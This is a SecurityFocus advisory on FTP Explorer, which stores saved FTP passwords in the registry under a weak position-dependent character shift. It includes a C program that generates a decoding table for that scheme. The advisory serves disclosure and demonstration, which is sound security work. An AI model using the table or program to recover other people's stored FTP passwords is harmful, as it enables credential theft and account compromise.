source: http://www.securityfocus.com/bid/1003/info

FTP Explorer includes the option to store profiles of visited FTP sites. The user's name and password can also be stored. These stored values are kept in the registry, under the key HKCU\Software\FTP Explorer\Profiles\ProfileName\ . The password is encrypted, but the encryption mechanism is weak and can easily be broken. 

Each character in the password is incremented by 9, then incremented by (3(n - 1)), n being the characters position in the password. Therefore, a password of AAA (A=41) would be stored as:
[A+9+3(1-1)] [A+9+3(2-1)] [A+9+3(3-1)], or 4A4D50.

*NOTE* This algorithm does not seem to apply for characters outside the range 0x20 - 0x7F. However, it is still possible to make a character based function f(x) such that the algorithm encrypts xyz as [f(x)+3(1-1)] [f(y)+3(2-1)] [f(z)+3(3-1)]. It is trivial to construct such a function for all 256 possible character values with a dictionary approach.

/*
 ** Este  codigo  demostra  como  funciona  a "criptografia" do software FTP 
 ** Explorer,  levando-se  em  consideracao  as informacoes  passadas para a 
 ** BOS-Br por Hever<Hever@vitech.net>.
 **
 ** author:  Nelson Brito 
 ** e-mails: nelson@sekure.org & nelson@secunet.com.br
 ** program: ftpe-crypt.c
 **
 ** ChangeLog:
 ** v 0.6b - arquivo de destino incluido(output file)
 **        - apartir desta versao sera' necessario a utilizacao de todos os
 **          argumentos na linha de comando
 ** v 0.5b - incluido opcoes longas na linha de comando
 **        - problemas da opcao '-h' corrigidos gracas a fpm :*( ) )
 ** v 0.4  - opcoes  de  linha  de comando  acrescentadas,  permitindo que o 
 **          usuario "set" suas preferencias [a.k.a. getopt(3)]
 ** v 0.3  - adicionado argumentos passados para a funcao r2()
 **        - contador a ser usado em r2() como argumento
 ** v 0.2  - desenvolvimento das funcao r2() e inclusao de u_abort()) e
 **          logo()
 **        - o length do password foi aumentado 
 ** v 0.1  - desenvolvimento inicial do esqueleto do programa, incluindo:
 **          > retirada dos caracteres especiais, ie, so' [a-z][A-Z][0-9]
 **          > uma simples PA, sem utilizacao de formula ou funcao
 **
 ** Agradecimentos a drk, Morauder e fpm pela forca com o getopt(3). =)
 ** 
 ** Como compilar(How to compile):
 ** lameness:~# gcc -Wall -O3 -g ftpe-crypt.c -o ftpe-crypt
 */ 

#include <stdio.h> 
#include <signal.h> 
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h> 
#define  VERSION   "0.6b"

int r2(int n, int p, int i, int b, FILE *fp){
      n=((n+b)+(i*p));
      fprintf(fp, "= %X ", n);
      return(n);
} 

char usage(char *p){
      fprintf(stderr, "use:     %s -l <length> -i <increment> -r <ratio> -o <output-file>\n", p);
      fprintf(stderr, "example: %s -l 15 -i 9 -r 3 -o outlist\n", p);
      fprintf(stderr, "options:\n\t -l, --length     password's length\n");
      fprintf(stderr, "\t -i, --increment  ASCII Table's increment\n");
      fprintf(stderr, "\t -r, --ratio      PA's ratio\n");
      fprintf(stderr, "\t -o, --output     output file\n");
      fprintf(stderr, "\nfor ftpe's criptography use r=3, i=9\n");
      exit(0);
}

int main(int ac, char **av){
   FILE *outlist = NULL;

   register int a = 48;
   int r = 0, inc = 0, ct = 0, op;

   printf("FTP Explorer's Criptography v%s - by Nelson Brito\n", VERSION);

   if(ac != 9) usage(av[0]); 

   while(1){
        static struct option long_options[] = {
           {"length",        1, 0, 'l'},
           {"ratio",         1, 0, 'r'},
           {"increment",     1, 0, 'i'},
           {"output",        1, 0, 'o'},
           {0,               0, 0, 0}
        };

        int option_index = 0;
        op = getopt_long(ac, av, "l:r:i:o:", long_options, &option_index);

        if (op == -1) break; 

        switch(op){
              case 'l':
                    ct = atoi(optarg);
                    break;
              case 'r':
                    r = atoi(optarg);
                    break;
              case 'i':
                    inc = atoi(optarg);
                    break;
             case 'o':
                    if(!(outlist=fopen(optarg, "w"))){
                       printf("unable to open %s\n", optarg);
                       exit(0);
                    }
                    break;
              default:
                    usage(av[0]);
                    break;
        }
   }
    
   while(a < 123){ 

        if((a >= 58) && (a <= 64)){
             printf("%c", (char)0);
             a++;
        } 

        else if((a >= 91) && (a <= 96)){
             printf("%c", (char)0);
             a++; 
        }

        else{
              register int c;

              fprintf(outlist, "%c ", (char)a);
              for(c = 0 ; c < ct ; c++) r2(a, c, r, inc, outlist); 
              fprintf(outlist, "\n");
              a++; 
        }

   }

   fclose(outlist);

   return(1);
} 